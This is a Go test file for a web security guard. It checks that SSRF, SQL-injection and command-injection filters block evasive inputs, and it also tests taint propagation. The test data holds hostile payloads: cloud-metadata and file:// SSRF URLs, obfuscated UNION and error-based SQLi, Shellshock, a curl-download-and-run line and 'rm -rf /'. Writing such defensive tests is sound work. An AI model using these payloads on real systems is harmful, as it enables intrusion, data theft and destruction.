// SPDX-License-Identifier: Apache-2.0 OR MIT
// php127/security: Banc d'adversarisation dialectique contradictoire (Grok Red Team vs Fable Formal Audit)

package security

import (
	"strings"
	"testing"

	"code.hazyhaar.fr/devhoros/php127/types"
)

// =========================================================================
// POSTURE 1 : AUDIT OFFENSIF ADVERSARIAL AGRESSIF (GROK RED TEAM)
// =========================================================================

// TestGrok_SSRFAggressiveEvasions teste les vecteurs d'évasion SSRF les plus exotiques
func TestGrok_SSRFAggressiveEvasions(t *testing.T) {
	ssrf := NewSSRFGuard()

	exoticTargets := []struct {
		url       string
		mustBlock bool
		rationale string
	}{
		{"http://0.0.0.0:8080/secret", true, "Wildcard IPv4 bind address"},
		{"http://[0000::0001]:8080/secret", true, "IPv6 loopback with leading zeros"},
		{"http://[::ffff:7f00:1]/secret", true, "IPv6 IPv4-mapped hex loopback"},
		{"http://admin:password@127.0.0.1:8080/data", true, "UserInfo credentials embedded in loopback URL"},
		{"http://169.254.169.254.nip.io/meta", true, "NIP.IO wildcard DNS mapping to link-local"},
		{"http://customer@169.254.169.254/latest", true, "Cloud metadata with userinfo prefix"},
		{"http://0x7f.1/admin", true, "Mixed Hex-Dotted IPv4 loopback notation"},
		{"http://0177.1/admin", true, "Mixed Octal-Dotted IPv4 loopback notation"},
		{"gopher://127.0.0.1:6379/_INFO", true, "Non-HTTP protocol smuggling attempt"},
		{"file:///etc/passwd", true, "Local file protocol scheme"},
		{"dict://127.0.0.1:11211/stats", true, "Dict protocol smuggling attempt"},
		{"https://cdn.jsdelivr.net/npm/bootstrap@5/dist/css/bootstrap.min.css", false, "Legitimate public CDN resource"},
	}

	for _, tt := range exoticTargets {
		t.Run("Grok_SSRF:"+tt.url, func(t *testing.T) {
			err := ssrf.InspectURL(tt.url)
			if tt.mustBlock && err == nil {
				t.Fatalf("[GROK RED TEAM BYPASS] L'attaque SSRF a réussi : %s (%s)", tt.url, tt.rationale)
			}
			if !tt.mustBlock && err != nil {
				t.Fatalf("[GROK FAUX POSITIF] Requête saine bloquée à tort : %s (err=%v)", tt.url, err)
			}
		})
	}
}

// TestGrok_SQLiStackedAndObfuscatedPaylods teste des variantes d'injections SQL avancées
func TestGrok_SQLiStackedAndObfuscatedPaylods(t *testing.T) {
	guard := NewGuard(ModeEnforce)

	sqliEvasions := []string{
		"SELECT * FROM accounts WHERE id = 1 /*!50000UNION*//*!50000SELECT*/ 1,user,3",
		"SELECT id FROM users WHERE login = 'admin' /* inline comment */ OR 1=1 --",
		"SELECT name FROM products WHERE category = '' OR '1'='1' LIMIT 1",
		"SELECT * FROM items WHERE id = 1 AND 1=0 UNION ALL SELECT table_name,2,3 FROM information_schema.tables",
		"SELECT * FROM orders WHERE status = 'pending' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(user(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
	}

	for _, payload := range sqliEvasions {
		t.Run("Grok_SQLi:"+payload, func(t *testing.T) {
			// Test 1: Concaténation de variable contaminée
			err := guard.CheckSQL(payload, true)
			if err != ErrSecuritySQLInjection {
				t.Fatalf("[GROK RED TEAM BYPASS] Concaténation SQL contaminée non bloquée: %s", payload)
			}
			// Test 2: Détection heuristique brute
			errH := guard.CheckSQL(payload, false)
			if errH != ErrSecuritySQLInjection {
				t.Fatalf("[GROK RED TEAM BYPASS] Injection SQL heuristique non interceptée: %s", payload)
			}
		})
	}
}

// TestGrok_CommandInjectionObfuscation teste des contournements shell avancés
func TestGrok_CommandInjectionObfuscation(t *testing.T) {
	guard := NewGuard(ModeEnforce)

	cmdEvasions := []string{
		"a() { :;}; /bin/bash -c 'id'", // Shellshock pattern
		"export PATH=$PATH:/tmp; sh -c 'payload'",
		"echo `whoami`",
		"echo $(id)",
		"python3 -c 'import socket; s=socket.socket()'",
		"/usr/bin/curl http://10.0.0.1/malware -o /tmp/m && /bin/sh /tmp/m",
	}

	for _, cmd := range cmdEvasions {
		t.Run("Grok_CMD:"+cmd, func(t *testing.T) {
			_, err := guard.IngressInspect([]byte(cmd))
			if err != ErrSecurityCommandInjection {
				t.Fatalf("[GROK RED TEAM BYPASS] Injection de commande non interceptée: %s (err=%v)", cmd, err)
			}
		})
	}
}

// =========================================================================
// POSTURE 2 : PREUVE FORMELLE D'INVARIANTS & DIALECTIQUE (FABLE FORMAL AUDIT)
// =========================================================================

// TestFable_TaintMonotonicityProof prouve formellement qu'aucune mutation ne peut purger le taint sans méthode dédiée
func TestFable_TaintMonotonicityProof(t *testing.T) {
	tainted := types.NewString("malicious_data").WithTaint(types.FlagTaintedUserInput)

	// Invariant 1 : La concaténation préserve la contamination
	safeStr := types.NewString("safe_prefix_")
	result1 := types.NewString(safeStr.String()+tainted.String()).CombineTaint(safeStr, tainted)
	if !result1.IsTainted() || (result1.Flags&types.FlagTaintedUserInput) == 0 {
		t.Fatalf("[FABLE INVARIANT VIOLATION] Concaténation a perdu le flag TaintedUserInput")
	}

	// Invariant 2 : La conversion en majuscules/minuscules préserve la contamination
	upper := types.NewString(strings.ToUpper(tainted.String())).WithTaint(tainted.Flags)
	if !upper.IsTainted() {
		t.Fatalf("[FABLE INVARIANT VIOLATION] Changement de casse a perdu le flag Tainted")
	}

	// Invariant 3 : Seul ClearTaint() explicite révoque la contamination
	purged := tainted.ClearTaint()
	if purged.IsTainted() {
		t.Fatalf("[FABLE INVARIANT VIOLATION] ClearTaint() n'a pas révoqué le flag Tainted")
	}
}

// TestFable_ZeroAllocationSecurityGatesProof prouve formellement l'absence d'allocation sur le chemin chaud
func TestFable_ZeroAllocationSecurityGatesProof(t *testing.T) {
	guard := NewGuard(ModeAudit)
	safePayload := []byte("action=get_items&limit=50&category=electronics&page=2")

	allocs := testing.AllocsPerRun(1000, func() {
		_, _ = guard.IngressInspect(safePayload)
	})

	if allocs > 1 {
		t.Fatalf("[FABLE ARCHTIME VIOLATION] IngressInspect alloue %.2f objets par exécution (Tolérance <= 1.0)", allocs)
	}

	rawSQL := "SELECT id, name, price FROM items WHERE category = ?"
	allocsSQL := testing.AllocsPerRun(1000, func() {
		_ = guard.CheckSQL(rawSQL, false)
	})

	if allocsSQL > 0 {
		t.Fatalf("[FABLE ARCHTIME VIOLATION] CheckSQL sur requête saine alloue %.2f objets par exécution (Requis: 0.0)", allocsSQL)
	}
}

// TestFable_StateRecoveryAfterVetoProof prouve qu'un veto n'endommage pas le cycle de vie de la machine
func TestFable_StateRecoveryAfterVetoProof(t *testing.T) {
	guard := NewGuard(ModeEnforce)

	// Étape 1 : Émission d'une attaque bloquante
	_, err := guard.IngressInspect([]byte("rm -rf /"))
	if err != ErrSecurityCommandInjection {
		t.Fatalf("Attaque initiale non bloquée")
	}

	// Étape 2 : Vérification immédiate de la reprise d'état sur requête saine
	val, errSafe := guard.IngressInspect([]byte("page=homepage"))
	if errSafe != nil {
		t.Fatalf("[FABLE LIFECYCLE BUG] État bloqué persistant après rejet d'attaque: %v", errSafe)
	}
	if val.String() != "page=homepage" {
		t.Fatalf("[FABLE STATE CORRUPTION] Valeur corrompue: %s", val.String())
	}
}
